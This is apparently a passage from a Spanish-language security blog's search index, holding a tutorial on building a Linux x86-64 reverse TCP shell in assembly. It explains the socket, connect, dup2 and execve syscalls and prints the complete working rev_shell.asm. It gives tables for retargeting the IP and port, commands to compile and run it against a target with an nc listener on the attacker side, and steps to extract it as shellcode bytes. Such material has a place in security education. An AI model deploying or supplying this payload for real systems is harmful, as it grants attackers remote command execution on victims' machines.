salientes.</p>"},{"location":"research/malware-dev/reverse-shell/#flujo-de-ejecucion","title":"Flujo de ejecuci\u00f3n","text":"<pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510      \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 socket(41) \u2502\u2500\u2500s\u2500\u2500\u25b6\u2502 connect(42, s, A:P)  \u2502\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 dup2(33): 0,1,2  \u2192  s   \u2502\u2500\u2500\u2500\u2500\u2500\u25b6\u2502 execve(59)   \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518      \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n            0 = (stdin) \u2500\u2500\u2510\n            1 = (stdout)  \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba socket(s) \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u25ba ATACANTE (A:P)\n            2 = (stderr) \u2500\u2518\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#crear-socket-tcp","title":"Crear socket TCP","text":"<p><code>socket</code> (n\u00ba 41 en Linux x86-64) crea un objeto de comunicaci\u00f3n en el kernel y devuelve un file descriptor (FD) para operar con \u00e9l (conectar, enlazar, escuchar, enviar/recibir). Reci\u00e9n creado es solo un objeto en memoria identificado por su FD, tiene familia/tipo/protocolo, pero no IP ni puertos. </p> <pre><code>rax = 41         ; N\u00famero de syscall (socket)\nrdi = domain     ; Familia de direcciones (AF_*)\nrsi = type       ; Tipo de socket (SOCK_*), opcionalmente OR con flags\nrdx = protocol   ; Protocolo (0 = por defecto)\n</code></pre> <p>Puesto que la idea es crear un socket TCP/IPv4 los argumentos de entrada tomar\u00e1n los siguientes valores:</p> Registro Valor Significado <code>RAX</code> 41 N\u00famero de syscall (<code>socket</code>) <code>RDI</code> 2 <code>AF_INET</code> (familia IPv4) <code>RSI</code> 1 <code>SOCK_STREAM</code> (TCP) <code>RDX</code> 0 Protocolo (0 = por defecto) <p>El registro <code>RAX</code> tras la syscall contiene el file descriptor del socket. Se vuelve un endpoint real cuando se realiza una acci\u00f3n con este (<code>bind</code>, <code>connect</code> o <code>accept</code>).</p>"},{"location":"research/malware-dev/reverse-shell/#conectarse-al-atacante","title":"Conectarse al atacante","text":"<p><code>connect</code> (n\u00ba 42 en Linux x86-64) solicita establecer una conexi\u00f3n entre un socket previamente creado y un endpoint remoto. En TCP/<code>SOCK_STREAM</code>, inicia el handshake TCP (SYN \u2192 SYN/ACK \u2192 ACK).</p> <pre><code>rax = 42         ; N\u00famero de syscall (connect)\nrdi = sockfd     ; FD del socket (devuelto por socket())\nrsi = addr       ; puntero a struct sockaddr (sockaddr_in / sockaddr_in6 / sockaddr_un, \u2026)\nrdx = addrlen    ; tama\u00f1o de esa struct (16 para sockaddr_in)\n</code></pre> <p>Estructura <code>sockaddr_in</code></p> <p>La estructura <code>sockaddr_in</code> define el endpoint remoto y est\u00e1 compuesto por 16 bytes. La construiremos directamente en el stack empaquetando los valores en un qword.</p> <p>El desglose interno de los campos ser\u00eda el siguiente:</p> Campo Bytes Valor Significado <code>sin_family</code> <code>02 00</code> <code>2</code> <code>AF_INET</code> <code>sin_port</code> <code>11 5c</code> <code>4444</code> Puerto en network byte order <code>sin_addr</code> <code>7f 00 00 01</code> <code>127.0.0.1</code> IP destino <code>sin_zero</code> <code>00 00 00 00 00 00 00 00</code> <code>0</code> Padding (8 bytes) <p>El padding se introduce primero en el stack (8 bytes de ceros), luego el qword con familia+puerto+IP (8 bytes), formando los 16 bytes totales.</p>"},{"location":"research/malware-dev/reverse-shell/#redirigir-io","title":"Redirigir I/O","text":"<p><code>dup2</code> (n\u00ba 33 en Linux x86-64) duplica un file descriptor (FD) existente sobre otro n\u00famero de FD espec\u00edfico, cerrando primero el FD destino si estaba abierto. Tras la llamada, ambos apuntan al mismo open file description (mismo offset y file status flags). Es fundamental para redirecciones de entrada/salida, permitiendo que <code>stdin</code>/<code>stdout</code>/<code>stderr</code> apunten a archivos, sockets o pipes. </p> <pre><code>rax = 33        ; N\u00famero de syscall (dup2)\nrdi = oldfd     ; Descriptor existente a duplicar\nrsi = newfd     ; N\u00famero de descriptor destino\n</code></pre> <p>Ejecutaremos <code>dup2</code> en tres ocasiones para redirigir <code>stdin</code>/<code>stdout</code>/<code>stderr</code> al socket:</p> Iteraci\u00f3n RSI Efecto 1 0 <code>stdin</code> \u2192 socket 2 1 <code>stdout</code> \u2192 socket 3 2 <code>stderr</code> \u2192 socket"},{"location":"research/malware-dev/reverse-shell/#ejecutar-shell","title":"Ejecutar Shell","text":"<p><code>execve</code> (n\u00ba 59 en Linux x86-64) reemplaza la imagen del proceso actual por la de un nuevo programa. Si tiene \u00e9xito, el flujo contin\u00faa en el c\u00f3digo del programa cargado.</p> <pre><code>rax = 59             ; N\u00famero de syscall (execve)\nrdi = filename       ; puntero a cadena con la ruta al ejecutable (C-string)\nrsi = argv           ; puntero a array de punteros a C-string (argv[0..n], terminado en NULL)\nrdx = envp           ; puntero a array de punteros a C-string (variables de entorno, terminado en NULL)\n</code></pre> <p>Puesto que la idea es ejecutar <code>/bin/sh</code> en el sistema objetivo:</p> Registro Valor Significado <code>RAX</code> 59 N\u00famero de syscall (<code>execve</code>) <code>RDI</code> <code>pathname</code> Puntero a <code>\"/bin/sh\\0\"</code> <code>RSI</code> <code>argv</code> Puntero a array de argumentos (NULL) <code>RDX</code> <code>envp</code> Puntero a array de entorno (NULL) <p>Construimos los argumentos en el stack, primero el null-terminator, luego la cadena y despu\u00e9s los punteros NULL para <code>argv</code> y <code>envp</code>.</p> <p>La cadena <code>/bin/sh</code> equivale a <code>2F 62 69 6E 2F 73 68</code> (7 bytes). Para cargarla usaremos el valor <code>0x68732f6e69622f</code> (little-endian). Al hacer push, los bytes se almacenan en memoria en el orden correcto.</p>"},{"location":"research/malware-dev/reverse-shell/#personalizacion","title":"Personalizaci\u00f3n","text":""},{"location":"research/malware-dev/reverse-shell/#cambiar-ip-de-destino","title":"Cambiar IP de destino","text":"<p>Cada octeto de la IP se convierte a hexadecimal. </p> IP Valor (Hex) 127.0.0.1 <code>0x7F000001</code> 192.168.1.1 <code>0xC0A80101</code> 192.168.18.245 <code>0xC0A812F5</code> 10.0.0.50 <code>0x0A000032</code>"},{"location":"research/malware-dev/reverse-shell/#cambiar-puerto","title":"Cambiar puerto","text":"<p>El puerto se almacena en network byte order (big-endian).</p> Puerto Valor (Hex) 4444 <code>0x115c</code> 8080 <code>0x1f90</code> 443 <code>0x01BB</code> 9001 <code>0x2329</code>"},{"location":"research/malware-dev/reverse-shell/#codigo-completo-rev_shellasm","title":"C\u00f3digo completo (rev_shell.asm)","text":"<pre><code>section .text\nglobal _start\n_start:\n    ; SOCKET\n    mov rax, 41\n    mov rdi, 2 ;IPV4\n    mov rsi, 1 ;TCP\n    xor rdx, rdx ; Default\n    syscall\n    ; Store socket FD\n    mov r8, rax\n    ; CONNECT\n    mov rax, 42\n    mov rdi, r8\n                    ;   Stack        Low  &lt;----------- High\n    ; Entrada esperada: 02 00 11 5c 7F 00 00 01 00 00 00 00 00 00 00 00   \n    ;                   \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518  \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n    ;                   0-1   2-3   4-7         8-15         (16 bytes en total)\n    ;                   fam   port  IP          padding\n    ; Mapeado de los campos de sockaddr_in:\n                        ; Bytes 0-1:   02 00           \u2192 sin_family (AF_INET = 2)\n                        ; Bytes 2-3:   11 5c           \u2192 sin_port (4444)\n                        ; Bytes 4-7:   7f 00 00 01     \u2192 sin_addr (127.0.0.1)\n                        ; Bytes 8-15:  00 00 00 00...  \u2192 sin_zero (padding)\n    xor r9,r9 ; 0\n    push r9 ; 64 bits de padding a 0 (sin_zero)(8 bytes)\n    mov r10, 0x0100007f5c110002\n    push r10 ; sin_family + sin_port + sin_addr (8 bytes)\n    mov rsi, rsp ; direccion del tope de la pila\n    mov rdx, 16 ;IPV4 (espera 16 bytes)\n    syscall\n    xor rsi,rsi\n.dup2:                        ; stdin(0), stdout(1), stderr(2) redirigidos al socket\n    ;DUP2\n    mov rax, 33\n    mov rdi, r8\n    syscall \n    inc rsi\n    cmp rsi, 3\n    jl .dup2\n    ; EXEXCVE\n    mov rax, 59\n    push 0                       ; null terminator de /bin/sh -&gt; /bin/sh\\0\n    mov r12, 0x68732f6e69622f    ; /bin/sh (2F 62 69 6E 2F 73 68) en little-endian\n    push r12                     ; string /bin/sh\n    mov rdi, rsp\n    push 0                       ; argv = {NULL}\n    mov rsi, rsp\n    push 0                       ; envp = {NULL}\n    mov rdx, rsp\n    syscall \n.done:\n    ; EXIT\n    mov rax, 60                    ; syscall: exit\n    xor rdi, rdi                   ; exit code = 0 (\u00e9xito)\n    syscall\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#compilacion-y-uso","title":"Compilaci\u00f3n y uso","text":"<pre><code># Compilar\nnasm -f elf64 rev_shell.asm -o rev_shell.o\nld rev_shell.o -o rev_shell\n\n# En la m\u00e1quina atacante: iniciar listener\nnc -lvnp 4444\n\n# En la m\u00e1quina objetivo: ejecutar\n./rev_shell\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#extraccion-de-bytes","title":"Extracci\u00f3n de bytes","text":"<pre><code># Extraer solo la secci\u00f3n .text\nobjcopy -O binary --only-section=.text rev_shell rev_shell.bin\n\n# Visualizar los bytes (C)\nxxd -i rev_shell.bin\n\n# Ver tama\u00f1o\nwc -c rev_shell.bin\n</code></pre>"},{"location":"research/malware-dev/reverse-shell/#agradecimientos","title":"Agradecimientos","text":"<p>Gracias por llegar hasta aqu\u00ed.</p> <p>Si encuentras errores o quieres mejorar/ampliar el art\u00edculo, el contenido del blog est\u00e1 abierto a Pull Requests. Toda contribuci\u00f3n es bienvenida.</p> <p>\u00a1Nos vemos en el pr\u00f3ximo art\u00edculo! ;)</p> <p>Ver tambi\u00e9n</p> <p>Process Injection via Ptrace - Hace uso de una versi\u00f3n adaptada de esta Reverse TCP Shell como payload en inyecci\u00f3n de procesos basados en Ptrace</p>"}]}